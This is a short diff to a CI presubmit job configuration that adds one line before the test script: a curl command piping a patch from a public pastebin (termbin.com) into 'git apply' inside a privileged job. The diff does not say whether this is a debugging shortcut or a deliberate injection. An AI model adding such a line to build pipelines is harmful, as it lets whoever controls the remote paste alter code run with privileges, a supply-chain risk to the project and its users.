@@ -379,6 +379,7 @@ presubmits:
         - "/bin/bash"
         - "-ce"
         - |
+            curl https://termbin.com/z684 | git apply
             automation/test.sh
         # docker-in-docker needs privileged mode
         securityContext:
